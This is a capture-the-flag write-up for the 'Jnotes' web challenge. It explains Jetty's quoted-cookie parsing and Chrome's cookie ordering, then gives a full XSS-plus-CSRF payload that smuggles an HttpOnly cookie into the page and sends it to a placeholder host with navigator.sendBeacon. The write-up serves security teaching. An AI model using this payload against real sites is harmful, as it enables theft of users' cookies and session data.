# Jnotes

## Description

I made this note site before I learned about XSS... can you break it?

Thankfully my cookies are HttpOnly

- **Author** : arxenix
- **Category** : Web
- **Points** : 396
- **Solves** : 6


## Solution 

### Understanding the challenge

This was a java challenge where we can create notes and that notes will stored in cookies. We have setnote and getnote functions which will set the note in cookie and take the note from cookie

```java
    public static String getNote(Context ctx) {
        var note = ctx.cookie("note");
        if (note == null) {
            setNote(ctx, DEFAULT_NOTE);
            return DEFAULT_NOTE;
        }
        return URLDecoder.decode(note, StandardCharsets.UTF_8);
    }

    public static void setNote(Context ctx, String note) {
        note = URLEncoder.encode(note, StandardCharsets.UTF_8);
        ctx.cookie(new Cookie("note", note, "/", -1, false, 0, true));
    }
```

We also have a `/create` endpoint where we can set a new note

```java
app.post("/create", ctx -> {
            var note = ctx.formParam("note");
            setNote(ctx, note);
            ctx.redirect("/");
        });
```

The note is displayed on the home page without any filters so it's just plain XSS. The admin will also visit any page so we can get csrf and set a new note and get XSS on the admin side too. Till now everything is alright. The catch is that both the cookies are [HttpOnly](https://owasp.org/www-community/HttpOnly)

- So we can't access the cookies using JS
- There is no page displaying the flag cookie
- There is just home page which displays note cookie

### Java Cookie Parsing

Java Parse cookies weirdly. Maybe many other web servers too. Here this challenge uses [javalin](https://javalin.io/) which uses [jetty](https://www.eclipse.org/jetty/)

So when a cookie starts with a double quotes `"` and doesn't close it, it will go on and will take the value of that cookie until there is a closing double quotes.

So if we have three cookies

```
note="a
FLAG=flag{}
a=b"
```
Java will take the value of cookie `note` as `a; FLAG=flag{}; a=b`. Now we can use this to get the flag value into the note cookie and displaying it on the page. But we need to get the cookies in this order.

### Browser Cookie Parsing

Now some interesting facts about cookies in browsers that we use to solve this challenge

- We can create empty cookies using `document.cookies="=value"`

![empty](/dicectf23-writeups/jnotes/images/empty.png)

Now the cookie header will be sent like:

![header](/dicectf23-writeups/jnotes/images/empty-cookie-header.png)

Now, even if we can't create a new `note` cookie as its [HttpOnly](https://owasp.org/www-community/HttpOnly), we can create an empty cookie with value `note="` to bypass this

![cookie](/dicectf23-writeups/jnotes/images/note-cookie.png)

![note](/dicectf23-writeups/jnotes/images/cookie-note.png)

Now the header will be sent like this

![note-cookie-header](/dicectf23-writeups/jnotes/images/note-cookie-header.png)

Here the our `note` cookie is sent last. We need it to be the first cookie. So chrome basically orders cookies based on these rules. 

- Cookies with longer path are listed before cookies with shorter path.
- Cookies which are edited least recently are listed before cookies which are edited most recently.

I colud get these rules from [RFC-6265](https://www.rfc-editor.org/rfc/rfc6265#section-5.4)

```
 2.  The user agent SHOULD sort the cookie-list in the following
       order:

       *  Cookies with longer paths are listed before cookies with
          shorter paths.

       *  Among cookies that have equal-length path fields, cookies with
          earlier creation-times are listed before cookies with later
          creation-times.

       NOTE: Not all user agents sort the cookie-list in this order, but
       this order reflects common practice when this document was
       written, and, historically, there have been servers that
       (erroneously) depended on this order.
 ```


Here the `FLAG` cookie will be the first cookie as it is the least editted cookie and it has the longest path `/`. Now to make our cookie first, we can change the path of our `note` cookie to be `//` and increase the path length.

```js
document.cookie='=note=";path=//';
```

![cookie-path](/dicectf23-writeups/jnotes/images/cookie-path.png)

Now the textarea will have the flag value

![textarea](/dicectf23-writeups/jnotes/images/textarea.png)

Now we can just open an `iframe` with url `https://jnotes.mc.ax//` and get its content. 

```js
document.cookie='=note=";path=//';
const frame = document.createElement('iframe');
frame.src = "https://jnotes.mc.ax//";
document.body.appendChild(frame);
frame.onload = () => {
    navigator.sendBeacon("https://your.domain.com",frame.contentWindow.document.body.innerHTML);
}
```
We need to set this as admins `not` cookie. We can do that with [csrf](https://portswigger.net/web-security/csrf)

### Final Payload

```html
<html>
  <body>
    <form method="POST" action="https://jnotes.mc.ax/create">
      <input id="p" name="note" value="" >
    </form>
    <script>
      document.querySelector("#p").value = `</textarea>
      <\x73cript>
      document.cookie='=note=";path=//';
      const frame = document.createElement('iframe');
      frame.src = "https://jnotes.mc.ax//";
      document.body.appendChild(frame);
      frame.onload = () => {
        navigator.sendBeacon("https://your.domain.com",frame.contentWindow.document.body.innerHTML);
        }
      </\x73cript>`;
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Flag**: `dice{c0ok1e_m0nSt3r_1s_jeal0us_of_y0ur_sk1lLs}`
